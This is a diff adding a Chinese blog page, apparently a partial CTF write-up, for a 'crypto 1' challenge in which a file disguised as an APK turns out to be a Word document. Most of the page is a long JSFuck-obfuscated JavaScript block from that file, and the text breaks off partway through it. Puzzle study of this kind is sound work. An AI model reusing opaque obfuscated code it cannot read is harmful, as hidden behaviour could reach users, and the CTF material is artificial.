@@ -1,0 +1,711 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="渗透测试,ctf," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> 安恒ctf 部分writeup // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              安恒ctf 部分writeup
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2017-12-17
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2017/12/17/dbappsec-ctf/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2017/12/17/dbappsec-ctf/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h1><h2 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto 1"></a>crypto 1</h2><p>cypto 1<br>notepad++查看 发现一串字符是<code>Microsoft Word 97-2003 文档</code>。<br>将原先的apk的后缀名改doc，打开。<br>获得<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]][<span class="string">([</span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]((![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>]+[<span class="string"></span>])[<span class="string">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]()[<span class="string">+!+[</span>]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(+![<span class="string"></span>]+[<span class="string">![</span>]]+([<span class="string"></span>]+[<span class="string"></span>])[<span class="string">([</span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+[<span class="string">+[</span>]]]+(+[<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+[<span class="string">+!+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+[<span class="string">+[</span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+[<span class="string">+[</span>]]+(+(+!+[<span class="string"></span>]+[<span class="string">+!+[</span>]]))[<span class="string">(!![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(+![<span class="string"></span>]+([<span class="string"></span>]+[<span class="string"></span>])[<span class="string">([</span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(+![<span class="string"></span>]+[<span class="string">![</span>]]+([<span class="string"></span>]+[<span class="string"></span>])[<span class="string">([</span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!+[</span>]]])[<span class="string">!+[</span>]+!+[<span class="string"></span>]+[<span class="string">+[</span>]]]](!+[<span class="string"></span>]+!+[<span class="string"></span>]+[<span class="string">+[</span>]])+[<span class="string">!+[</span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]+!+[<span class="string"></span>]]+[<span class="string">!+[</span>]+!+[<span class="string"></span>]]+([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string">![</span>]]+[<span class="string"></span>][<span class="symbol">[</span>]])[<span class="string">+!+[</span>]+[<span class="string">+[</span>]]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!+[<span 